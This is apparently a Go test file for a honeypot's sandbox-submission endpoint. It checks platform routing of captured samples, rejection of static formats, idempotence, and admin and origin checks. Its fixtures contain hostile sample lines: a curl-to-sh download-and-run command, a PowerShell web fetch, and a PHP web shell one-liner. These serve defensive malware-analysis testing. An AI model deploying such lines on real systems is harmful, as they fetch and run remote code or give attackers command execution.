package main

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The determination path is the whole safety argument for a second backend:
// a Windows sample handed to the Linux runner does nothing useful, and a
// static-only artifact handed to either one occupies a guest for the full
// observation window and produces an empty report.
func TestDetermineSandboxTargetRoutesByPlatformAfterDynamic(t *testing.T) {
	pe := "MZ\x90\x00this is not a parseable PE, only a DOS stub"
	for _, tc := range []struct {
		name   string
		body   string
		target sandboxTarget
		want   bool
	}{
		{"pe executable", pe, targetWindows, true},
		{"batch script", "@echo off\nsetlocal\nstart /b payload.exe\n", targetWindows, true},
		{"powershell", "$env:temp; Invoke-WebRequest http://198.51.100.9/a\n", targetWindows, true},
		{"vbscript", "dim x\nset x = wscript.createobject(\"wscript.shell\")\n", targetWindows, true},
		{"shell script", "#!/bin/sh\ncurl http://198.51.100.7/x | sh\n", targetLinux, true},
		{"elf executable", "\x7fELF\x02\x01\x01\x00 not a parseable ELF header", targetLinux, true},
		{"python script", "#!/usr/bin/python3\nimport os\nprint(os.getcwd())\n", targetLinux, true},
		{"php script", "<?php system($_GET['c']); ?>", targetLinux, true},
		{"pdf document", "%PDF-1.7\ntrailer", "", false},
		{"zip archive", "PK\x03\x04rest of an archive", "", false},
		{"plain text", "just some captured text, nothing executable", "", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			target, dynamic := determineSandboxTarget([]byte(tc.body))
			if dynamic != tc.want || target != tc.target {
				t.Fatalf("determineSandboxTarget = (%q, %v), want (%q, %v)", target, dynamic, tc.target, tc.want)
			}
		})
	}
}

// An OLE document classifies as Platform "Windows" and Dynamic false. Checking
// the platform before the dynamic flag would queue it on the Windows guest,
// which cannot detonate it. This is the one ordering the function must get
// right, so it gets its own test rather than a row above.
func TestDetermineSandboxTargetRejectsStaticWindowsFormats(t *testing.T) {
	ole := append([]byte{0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1}, []byte("legacy office document")...)
	if c := classifyPayload(ole); c.Platform != "Windows" || c.Dynamic {
		t.Fatalf("fixture no longer exercises the ordering trap: platform=%q dynamic=%v", c.Platform, c.Dynamic)
	}
	if target, dynamic := determineSandboxTarget(ole); dynamic || target != "" {
		t.Fatalf("determineSandboxTarget = (%q, %v), want no target for a static Windows format", target, dynamic)
	}
}

type submitFixture struct {
	store  *store
	hash   string
	linux  string
	winDir string
}

func newSubmitFixture(t *testing.T, body string) submitFixture {
	t.Helper()
	payloads, linux, windows := t.TempDir(), t.TempDir(), t.TempDir()
	hash := strings.Repeat("e", 64)
	if err := os.WriteFile(filepath.Join(payloads, hash), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("DASHBOARD_REQUIRE_ADMIN", "true")
	configureIdentityTestBackend(t, "admin")
	t.Setenv("SANDBOX_REQUEST_DIR", linux)
	t.Setenv("WINDOWS_SANDBOX_REQUEST_DIR", windows)
	return submitFixture{store: &store{payloadDirs: []string{payloads}}, hash: hash, linux: linux, winDir: windows}
}

func (f submitFixture) submit(t *testing.T) *httptest.ResponseRecorder {
	t.Helper()
	r := httptest.NewRequest(http.MethodPost, "https://honeypot.example/sandbox/submit", strings.NewReader("hash="+f.hash))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	addIdentityTestCookie(r)
	r.Header.Set("Origin", "https://honeypot.example")
	w := httptest.NewRecorder()
	f.store.serveSandboxSubmit(w, r)
	return w
}

func spooled(t *testing.T, dir string) []string {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	names := make([]string, 0, len(entries))
	for _, entry := range entries {
		names = append(names, entry.Name())
	}
	return names
}

func TestSandboxSubmitSpoolsWindowsAndLinuxSeparately(t *testing.T) {
	for _, tc := range []struct {
		name          string
		body          string
		wantIn        func(submitFixture) string
		wantEmpty     func(submitFixture) string
		wantURLTarget string
	}{
		{
			"windows PE", "MZ\x90\x00this is not a parseable PE, only a DOS stub",
			func(f submitFixture) string { return f.winDir },
			func(f submitFixture) string { return f.linux },
			"target=windows",
		},
		{
			"linux shell", "#!/bin/sh\ncurl http://198.51.100.7/x | sh\n",
			func(f submitFixture) string { return f.linux },
			func(f submitFixture) string { return f.winDir },
			"target=linux",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newSubmitFixture(t, tc.body)
			w := f.submit(t)
			if w.Code != http.StatusSeeOther {
				t.Fatalf("status=%d body=%s", w.Code, w.Body.String())
			}
			if got := spooled(t, tc.wantIn(f)); len(got) != 1 || got[0] != f.hash+".request" {
				t.Fatalf("chosen spool holds %v, want exactly %s.request", got, f.hash)
			}
			if got := spooled(t, tc.wantEmpty(f)); len(got) != 0 {
				t.Fatalf("the other backend's spool was written: %v", got)
			}
			if location := w.Header().Get("Location"); !strings.Contains(location, tc.wantURLTarget) {
				t.Fatalf("location=%q, want %s", location, tc.wantURLTarget)
			}
		})
	}
}

// Clicking twice, or a double-submitting browser, must not queue two runs.
func TestSandboxSubmitIsIdempotentPerBackend(t *testing.T) {
	f := newSubmitFixture(t, "MZ\x90\x00this is not a parseable PE, only a DOS stub")
	for i := range 3 {
		if w := f.submit(t); w.Code != http.StatusSeeOther {
			t.Fatalf("submit %d: status=%d body=%s", i, w.Code, w.Body.String())
		}
	}
	if got := spooled(t, f.winDir); len(got) != 1 {
		t.Fatalf("three submissions produced %v, want one request", got)
	}
}

func TestSandboxSubmitRejectsPayloadsWithNoDetonationPath(t *testing.T) {
	f := newSubmitFixture(t, "%PDF-1.7\ntrailer")
	w := f.submit(t)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("status=%d body=%s", w.Code, w.Body.String())
	}
	if got := spooled(t, f.linux); len(got) != 0 {
		t.Fatalf("linux spool written for a static-only payload: %v", got)
	}
	if got := spooled(t, f.winDir); len(got) != 0 {
		t.Fatalf("windows spool written for a static-only payload: %v", got)
	}
}

// A host without the Windows guest must say so rather than fall back to the
// Linux spool, where the runner would try to execute a PE file.
func TestSandboxSubmitRefusesWindowsWhenTheGuestIsNotConfigured(t *testing.T) {
	f := newSubmitFixture(t, "MZ\x90\x00this is not a parseable PE, only a DOS stub")
	t.Setenv("WINDOWS_SANDBOX_REQUEST_DIR", "")
	w := f.submit(t)
	if w.Code != http.StatusServiceUnavailable {
		t.Fatalf("status=%d body=%s", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "windows") {
		t.Fatalf("body=%q, want it to name the backend that is missing", w.Body.String())
	}
	if got := spooled(t, f.linux); len(got) != 0 {
		t.Fatalf("windows payload fell back to the linux spool: %v", got)
	}
}

func TestSandboxSubmitStillRequiresAdminAndSameOrigin(t *testing.T) {
	f := newSubmitFixture(t, "MZ\x90\x00this is not a parseable PE, only a DOS stub")

	// "user" rather than an invented role: resolveIdentity only trusts admin
	// and user, and anything else fails as unavailable instead of forbidden,
	// which would test the wrong rejection.
	configureIdentityTestBackend(t, "user")
	r := httptest.NewRequest(http.MethodPost, "https://honeypot.example/sandbox/submit", strings.NewReader("hash="+f.hash))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	addIdentityTestCookie(r)
	r.Header.Set("Origin", "https://honeypot.example")
	w := httptest.NewRecorder()
	f.store.serveSandboxSubmit(w, r)
	if w.Code != http.StatusForbidden {
		t.Fatalf("non-admin status=%d, want 403", w.Code)
	}

	configureIdentityTestBackend(t, "admin")
	r = httptest.NewRequest(http.MethodPost, "https://honeypot.example/sandbox/submit", strings.NewReader("hash="+f.hash))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	addIdentityTestCookie(r)
	r.Header.Set("Origin", "https://evil.example")
	w = httptest.NewRecorder()
	f.store.serveSandboxSubmit(w, r)
	if w.Code != http.StatusForbidden {
		t.Fatalf("cross-origin status=%d, want 403", w.Code)
	}

	if got := spooled(t, f.winDir); len(got) != 0 {
		t.Fatalf("a rejected request still reached the spool: %v", got)
	}
}
